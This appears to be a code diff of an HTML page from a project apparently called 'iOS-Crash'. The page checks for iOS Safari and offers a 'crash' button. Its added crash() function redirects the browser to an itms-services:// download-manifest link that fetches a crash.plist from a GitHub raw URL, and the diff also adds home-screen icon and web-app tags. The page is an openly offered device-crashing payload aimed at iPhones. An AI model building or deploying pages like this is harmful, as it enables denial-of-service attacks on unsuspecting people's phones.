@@ -25,14 +25,26 @@
                 height: 100%;
             }
 		</style>
+		<link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://raw.githubusercontent.com/orionweblab/iOS-Crash/master/crash/apple-icon-57x57-precomposed.png" />
+		<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://raw.githubusercontent.com/orionweblab/iOS-Crash/master/crash/apple-icon-72x72-precomposed.png" />
+		<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://raw.githubusercontent.com/orionweblab/iOS-Crash/master/crash/apple-icon-114x114-precomposed.png" />
+		<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raw.githubusercontent.com/orionweblab/iOS-Crash/master/crash/apple-icon-144x144-precomposed.png" />
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black">
 	</head>
 	<body>
-		<h1 id="display"><button onclick="location.href='itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/orionweblab/iOS-Crash/master/crash/crash.plist';">crash</button></h1>
+		<h1 id="display"><button onclick="crash();">crash</button></h1>
 		<script>
 	    	var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
 			var display = document.getElementById("display");
 			if(!isSafari){
 			    display.innerHTML = "please use an ios device on safari";
+			}
+		</script>
+		<script>
+			function crash(){
+				location.href='itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/orionweblab/iOS-Crash/master/crash/crash.plist';
+				display.innerHTML = "crashing...";
 			}
 		</script>
 	</body>
